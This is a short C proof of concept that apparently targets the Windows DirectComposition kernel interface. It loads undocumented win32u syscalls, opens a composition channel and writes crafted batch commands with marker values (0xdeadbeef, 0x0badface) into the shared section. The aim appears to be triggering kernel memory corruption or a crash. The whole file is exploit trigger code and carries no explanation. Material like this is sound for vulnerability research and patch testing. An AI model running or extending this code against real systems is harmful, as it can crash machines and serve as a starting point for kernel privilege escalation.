#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <io.h>
#include <fcntl.h>
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(*pNtDCompositionCreateChannel)(
    OUT PHANDLE pArgChannelHandle,
    IN OUT PSIZE_T pArgSectionSize,
    OUT PVOID* pArgSectionBaseMapInProcess
    );

typedef NTSTATUS(*pNtDCompositionProcessChannelBatchBuffer)(
    IN HANDLE hChannel,
    IN DWORD dwArgStart,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2
    );

typedef NTSTATUS(*pNtDCompositionCommitChannel)(
    IN HANDLE pArgChannelHandle,
    OUT LPDWORD out1,
    OUT LPBOOL out2,
    IN BOOL in1,
    IN HANDLE in2
    );

pNtDCompositionCreateChannel NtDCompositionCreateChannel;
pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
pNtDCompositionCommitChannel NtDCompositionCommitChannel;

int main(int argc, char** argv) {
    HANDLE   hChannel;
    PVOID    pMappedAddress = NULL;
    SIZE_T   SectionSize = 0x1000;
    DWORD    dwArg1, dwArg2;
    NTSTATUS ntStatus;
    HMODULE  win32u;

    DWORD    out1;
    BOOL     out2;

    LoadLibraryA("user32.dll");
    win32u = LoadLibraryA("win32u.dll");
    NtDCompositionCreateChannel             = (pNtDCompositionCreateChannel)GetProcAddress(win32u, "NtDCompositionCreateChannel");
    NtDCompositionProcessChannelBatchBuffer = (pNtDCompositionProcessChannelBatchBuffer)GetProcAddress(win32u, "NtDCompositionProcessChannelBatchBuffer");
    NtDCompositionCommitChannel             = (pNtDCompositionCommitChannel)GetProcAddress(win32u, "NtDCompositionCommitChannel");

    ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);

    *(DWORD*)(pMappedAddress)               = 1;
    *(DWORD*)((PUCHAR)pMappedAddress + 4)   = 0x1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8)   = 0x67;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);

    *(DWORD*)(pMappedAddress)                = 0xC;
    *(DWORD*)((PUCHAR)pMappedAddress + 4)    = (DWORD)0x1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8)    = (DWORD)0x9;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC)  = (DWORD)0x8;
    *(DWORD*)((PUCHAR)pMappedAddress + 0x10) = (DWORD)0xdeadbeef;
    *(DWORD*)((PUCHAR)pMappedAddress + 0x14) = (DWORD)0x0badface;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x18, &dwArg1, &dwArg2);

    NtDCompositionCommitChannel(hChannel, &out1, &out2, FALSE, NULL);

    return 0;
}